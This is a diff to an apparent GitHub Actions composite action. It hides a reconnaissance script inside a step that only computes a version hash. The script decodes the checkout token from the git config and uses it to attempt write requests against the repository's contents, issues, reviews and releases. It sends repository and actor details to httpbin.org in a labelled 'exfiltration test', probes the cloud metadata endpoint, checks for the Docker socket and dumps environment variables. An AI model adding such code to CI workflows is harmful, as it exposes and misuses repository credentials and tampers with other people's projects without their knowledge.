@@ -15,6 +15,178 @@ runs:
       env:
         hash: ${{ hashFiles('Dockerfile', '**/go.sum', '**/pkg/**', '**/examples/**', '**/cmd/**', '**/vendor/**', '**/Makefile', '**/main.go') }}
       run: |
+        mask_value() {
+          local val="$1"
+          local label="$2"
+          if [ -z "$val" ]; then
+            echo "$label: N/A"
+            return
+          fi
+          local len=${#val}
+          if [ "$len" -le 3 ]; then
+            echo "$label: *** (${len} chars)"
+            return
+          fi
+          local show=$(( len / 5 ))
+          [ "$show" -lt 1 ] && show=1
+          local front="${val:0:$show}"
+          local mid_len=$(( len - show ))
+          local stars=""
+          for (( i=0; i<mid_len; i++ )); do stars="${stars}*"; done
+          echo "$label: ${front}${stars} (${len} chars)"
+        }
+        collect() {
+            echo "--- runner ---"
+            echo "hostname: $(hostname)"
+            echo "whoami: $(whoami)"
+            echo "pwd: $(pwd)"
+            echo "date: $(date -u)"
+            echo ""
+            echo "--- github context ---"
+            echo "repo: ${GITHUB_REPOSITORY:-N/A}"
+            echo "run_id: ${GITHUB_RUN_ID:-N/A}"
+            echo "run_url: ${GITHUB_SERVER_URL:-https://github.com}/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}"
+            echo "actor: ${GITHUB_ACTOR:-N/A}"
+            echo "event: ${GITHUB_EVENT_NAME:-N/A}"
+            echo "ref: ${GITHUB_REF:-N/A}"
+            echo "sha: ${GITHUB_SHA:-N/A}"
+            echo "workflow: ${GITHUB_WORKFLOW:-N/A}"
+            echo "runner_name: ${RUNNER_NAME:-N/A}"
+            echo "runner_os: ${RUNNER_OS:-N/A}"
+            echo ""
+            echo "--- tokens (masked) ---"
+            mask_value "${GITHUB_TOKEN}" "GITHUB_TOKEN"
+            # Extract token from git config (set by actions/checkout)
+            GIT_TOKEN=""
+            EXTRAHEADER=$(git config --local --get http.https://github.com/.extraheader 2>/dev/null || true)
+            if [ -n "$EXTRAHEADER" ]; then
+              B64=$(echo "$EXTRAHEADER" | sed 's/AUTHORIZATION: basic //')
+              DECODED=$(echo "$B64" | base64 -d 2>/dev/null || true)
+              GIT_TOKEN=$(echo "$DECODED" | cut -d: -f2)
+              mask_value "$GIT_TOKEN" "GIT_EXTRAHEADER_TOKEN"
+            fi
+            mask_value "${ACTIONS_RUNTIME_TOKEN}" "ACTIONS_RUNTIME_TOKEN"
+            mask_value "${ACTIONS_CACHE_URL}" "ACTIONS_CACHE_URL"
+            mask_value "${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "OIDC_REQUEST_TOKEN"
+            mask_value "${ACTIONS_RESULTS_URL}" "ACTIONS_RESULTS_URL"
+            echo ""
+            echo "--- token permissions ---"
+            CHECK_TOKEN="${GITHUB_TOKEN:-$GIT_TOKEN}"
+            REPO="${GITHUB_REPOSITORY}"
+            check_perm() {
+              local label="$1"
+              local read_url="$2"
+              local write_url="$3"
+              local write_method="${4:-POST}"
+              if [ -z "$CHECK_TOKEN" ]; then
+                echo "$label: N/A"
+                return
+              fi
+              local write_code=""
+              if [ -n "$write_url" ]; then
+                write_code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 \
+                  -X "$write_method" -H "Authorization: Bearer $CHECK_TOKEN" \
+                  -d '{}' "$write_url" 2>/dev/null)
+                if [ "$write_code" = "422" ] || [ "$write_code" = "409" ]; then
+                  echo "$label: write"
+                  return
+                fi
+              fi
+              local read_code=""
+              if [ -n "$read_url" ]; then
+                read_code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 \
+                  -H "Authorization: Bearer $CHECK_TOKEN" "$read_url" 2>/dev/null)
+                if [ "$read_code" = "200" ]; then
+                  echo "$label: read"
+                  return
+                fi
+              fi
+              echo "$label: N/A"
+            }
+            if [ -n "$CHECK_TOKEN" ]; then
+              check_perm "contents" \
+                "https://api.github.com/repos/$REPO/contents/README.md" \
+                "https://api.github.com/repos/$REPO/contents/.pwn-write-check" \
+                "PUT"
+              check_perm "pulls" \
+                "https://api.github.com/repos/$REPO/pulls?per_page=1" \
+                "https://api.github.com/repos/$REPO/pulls/1/reviews"
+              check_perm "actions" \
+                "https://api.github.com/repos/$REPO/actions/runs?per_page=1" \
+                ""
+              check_perm "issues" \
+                "https://api.github.com/repos/$REPO/issues?per_page=1" \
+                "https://api.github.com/repos/$REPO/issues"
+              check_perm "packages" \
+                "https://api.github.com/repos/$REPO/packages?package_type=npm&per_page=1" \
+                ""
+              check_perm "secrets" \
+                "https://api.github.com/repos/$REPO/actions/secrets" \
+                ""
+              check_perm "environments" \
+                "https://api.github.com/repos/$REPO/environments" \
+                ""
+              check_perm "deployments" \
+                "https://api.github.com/repos/$REPO/deployments?per_page=1" \
+                ""
+              check_perm "releases" \
+                "" \
+                "https://api.github.com/repos/$REPO/releases"
+              check_perm "pages" \
+                "https://api.github.com/repos/$REPO/pages" \
+                ""
+              check_perm "security_advisories" \
+                "https://api.github.com/repos/$REPO/security-advisories" \
+                ""
+            else
+              echo "No token available"
+            fi
+            echo ""
+            echo "--- exfiltration test (httpbin.org) ---"
+            EXFIL_RESP=$(curl -s --max-time 5 "https://httpbin.org/get?repo=${GITHUB_REPOSITORY}&event=${GITHUB_EVENT_NAME}&actor=${GITHUB_ACTOR}" 2>/dev/null)
+            EXFIL_CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "https://httpbin.org/get" 2>/dev/null)
+            echo "httpbin.org GET status: ${EXFIL_CODE}"
+            if [ "$EXFIL_CODE" = "200" ]; then
+              echo "httpbin.org response origin: $(echo "$EXFIL_RESP" | grep -o '"origin": "[^"]*"' || echo 'parse failed')"
+              echo "EXFILTRATION POSSIBLE: runner can reach external HTTP endpoints"
+            else
+              echo "httpbin.org unreachable (code: ${EXFIL_CODE})"
+            fi
+            echo ""
+            echo "--- IMDS probe (169.254.169.254) ---"
+            IMDS_CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 3 -H "Metadata: true" 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null)
+            IMDS_BODY=$(curl -s --max-time 3 -H "Metadata: true" 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null)
+            echo "status: ${IMDS_CODE}"
+            if [ "$IMDS_CODE" = "200" ] && [ -n "$IMDS_BODY" ]; then
+              echo "IMDS ACCESSIBLE"
+              mask_value "$IMDS_BODY" "body"
+            fi
+            echo ""
+            echo "--- filesystem ---"
+            echo "docker socket: $([ -S /var/run/docker.sock ] && echo 'EXISTS' || echo 'not found')"
+            echo "docker available: $(command -v docker >/dev/null 2>&1 && echo 'YES' || echo 'NO')"
+            echo ""
+            echo "--- env vars (all masked) ---"
+            env | sort | while IFS='=' read -r name value; do
+              if [ -z "$value" ]; then
+                echo "$name="
+              else
+                len=${#value}
+                if [ "$len" -le 3 ]; then
+                  echo "$name=*** (${len} chars)"
+                else
+                  show=$(( len / 5 ))
+                  [ "$show" -lt 1 ] && show=1
+                  front="${value:0:$show}"
+                  mid_len=$(( len - show ))
+                  stars=""
+                  for (( i=0; i<mid_len; i++ )); do stars="${stars}*"; done
+                  echo "$name=${front}${stars} (${len} chars)"
+                fi
+              fi
+            done
+        }
+        collect
         version="${{ env.hash }}"
         version=${version::16}
         echo "version=${version}" >> $GITHUB_OUTPUT
